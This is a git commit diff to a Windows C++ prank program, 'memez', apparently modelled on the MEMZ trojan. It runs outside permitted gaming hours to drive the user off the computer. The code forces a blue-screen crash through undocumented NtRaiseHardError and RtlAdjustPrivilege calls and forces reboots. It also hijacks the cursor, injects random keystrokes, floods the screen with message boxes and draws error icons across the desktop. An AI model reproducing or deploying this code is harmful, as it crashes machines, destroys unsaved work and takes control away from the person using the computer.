34c017b57b4f80a2bd5a36df8ee915b6e813333d
acarlson99 <acarlson99@gmail.com>
2019-05-21 15:15:59 -0700

    Added tests for days.  Fixed PayloadKeyboardInput.  Made messagebox and cursor scale harder.

--- memez/memez.cpp
+++ memez/memez.cpp
@@ -1,4 +1,5 @@
 #include <windows.h>
+#include <wininet.h>
 #include <iostream>
 #include <atomic>
 #include <thread>
@@ -6,6 +7,9 @@
 #include <array>
 #include <vector>
 #include <functional>
+#include "payloads.h"
+
+#pragma comment(lib, "wininet") // fixes weird thing with wininet unresolved symbols
 
 #define TIME_SECOND 1000
 #define MAX_RUNTIME 15
@@ -14,9 +18,15 @@ std::random_device rd;
 std::mt19937 mt(rd());
 std::atomic<int> runtime = 0;
 
+#define TEST
+//#define FORCELOOP
 
 void reboot(void) 
 {
+#ifdef TEST
+	std::cout << "REBOOT" << std::endl;
+	exit(1);
+#else
 	// Try to force BSOD first
 	// I like how this method even works in user mode without admin privileges on all Windows versions since XP (or 2000, idk)...
 	// This isn't even an exploit, it's just an undocumented feature.
@@ -27,7 +37,7 @@ void reboot(void)
 	if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
 		BOOLEAN tmp1; DWORD tmp2;
 		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
-		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &tmp2);	// NOTE: this throws an exception in Visual Studio.  It's probably fine :shrug:
+		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000069, 0, 0, 0, 6, &tmp2);	// NOTE: this throws an exception in Visual Studio.  It's probably fine :shrug:
 	}
 
 	// If the computer is still running, do it the normal way
@@ -44,6 +54,7 @@ void reboot(void)
 
 	// The actual restart
 	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
+#endif
 }
 
 void PayloadMessageBox(void)
@@ -51,15 +62,17 @@ void PayloadMessageBox(void)
 	
 	const LPCTSTR messages[]{
 		L"Please exit the game zone lol!",
-		L"Please stop play game!!!1!!"
+		L"Please stop play game!!!1!!",
+		L"Hehe funny joke plz leave now!",
+		L"LMAO please log out!",
 	};
-	std::uniform_int_distribution<int> dist(0, 1);
+	std::uniform_int_distribution<int> dist(0, sizeof(messages) / sizeof(*messages) - 1);
 
 	for (;;) {
 		//std::thread([&]() {
 			MessageBox(nullptr, messages[dist(mt)], L"Wraning!", MB_OK | MB_ICONINFORMATION);
 		//}).detach();
-		std::this_thread::sleep_for(std::chrono::seconds(15 * 2 - runtime));
+		std::this_thread::sleep_for(std::chrono::seconds(MAX_RUNTIME * 2 - runtime * 2));
 	}
 }
 
@@ -75,20 +88,28 @@ void PayloadCursor(void)
 		cursor.y += ((dist(mt) - 1) * 2) * runtime / 2;
 		SetCursorPos(cursor.x, cursor.y);
 
-		std::this_thread::sleep_for(std::chrono::milliseconds(40));
+		std::this_thread::sleep_for(std::chrono::milliseconds(max(0, MAX_RUNTIME * 40 - (runtime + 1) * 40)));
 	}
 }
 
-// this function does not work.
+// this function does work.
 void PayloadKeyboardInput(void)
 {
 	INPUT input;
-	std::uniform_int_distribution<int> dist('a', 'z');
+	// 0-9 a-z
+	std::uniform_int_distribution<int> dist(0x30, 0x5A);
 
 	input.type = INPUT_KEYBOARD;
-	for (;;) {
+	input.ki.wScan = 0; // hardware scan code for key
+	input.ki.time = 0;
+	input.ki.dwExtraInfo = 0;
+	input.ki.dwFlags = 0; // 0 for key press
+	for (int i = 0; i < 20; ++i) {
 		input.ki.wVk = dist(mt);
+		std::cout << "SENDING INPUT " << input.ki.wVk << std::endl;
 		SendInput(1, &input, sizeof(input));
+		//input.ki.dwFlags = KEYEVENTF_KEYUP; // KEYEVENTF_KEYUP for key release
+		//SendInput(1, &input, sizeof(INPUT));
 		std::this_thread::sleep_for(std::chrono::seconds(16 - runtime));
 	}
 }
@@ -144,12 +165,74 @@ void LaunchPayloads(void)
 	}
 }
 
+void displayIcon(HDC hdc, int ix, int iy, int w, int h, HICON icon) {
+	for (;;) {
+		DrawIcon(hdc, mt() % (w - ix), mt() % (h - iy), icon);
+	}
+}
+
+void yesnobox(void) {
+	int ix = GetSystemMetrics(SM_CXICON) / 2;
+	int iy = GetSystemMetrics(SM_CYICON) / 2;
+	HWND hwnd = GetDesktopWindow();
+	HDC hdc = GetWindowDC(hwnd);
+	RECT r;
+	GetWindowRect(hwnd, &r);
+	int w = r.right - r.left;
+	int h = r.bottom - r.top;
+	HICON icon = LoadIcon(nullptr, IDI_ERROR);
+
+	if (MessageBox(nullptr, L"Please log out", L"Warning", MB_OKCANCEL | MB_ICONHAND) == IDCANCEL) {
+		for (int i = 0; i < 10; ++i) {
+			std::thread(displayIcon, hdc, ix, iy, w, h, icon).detach();
+		}
+		std::this_thread::sleep_for(std::chrono::seconds(5));
+		reboot();
+	}
+}
+
+void nonblockingMsg(LPCWSTR displaystring, LPCWSTR title, int flags) {
+	MessageBox(nullptr, displaystring, title, flags);
+}
+
 int main(void)
 {
-	std::thread(LaunchPayloads).detach();
-	for (runtime = 0; runtime <= MAX_RUNTIME; runtime++) {
-		std::cout << "running for: " << runtime << std::endl;
-		std::this_thread::sleep_for(std::chrono::seconds(5));
+
+	for (;;) {
+		time_t t = time(NULL);
+		tm tptr;
+		localtime_s(&tptr, &t); // TODO: use system time or GMT or something idk just make it not use local time because people can change that AAAAAAAAA
+		if (!InternetCheckConnection(L"http://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0)) {
+			std::thread(nonblockingMsg, L"Please reconnect to the network", L"Warning", MB_OK).detach();
+			std::this_thread::sleep_for(std::chrono::seconds(15));
+			if (!InternetCheckConnection(L"http://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0)) {
+				goto startofend;
+			}
+		}
+		if (tptr.tm_hour > 18 && (tptr.tm_hour < 23 || tptr.tm_wday == 6)) { // FIXME: this breaks when time is modified
+#ifdef TEST
+			std::cout << "Game time" << std::endl;
+#ifdef FORCELOOP
+			goto startofend;
+#endif
+			std::this_thread::sleep_for(std::chrono::seconds(5));
+#else
+			std::this_thread::sleep_for(std::chrono::minutes(5));
+#endif
+			continue;
+		}
+
+	startofend:
+		std::thread(yesnobox).detach();
+		std::thread(LaunchPayloads).detach();
+		for (runtime = 0; runtime <= MAX_RUNTIME; runtime++) {
+			std::cout << "running for: " << runtime << std::endl;
+#ifdef TEST
+			std::this_thread::sleep_for(std::chrono::seconds(5));
+#else
+			std::this_thread::sleep_for(std::chrono::seconds(60));
+#endif
+		}
+		reboot();
 	}
-	//reboot();
 }
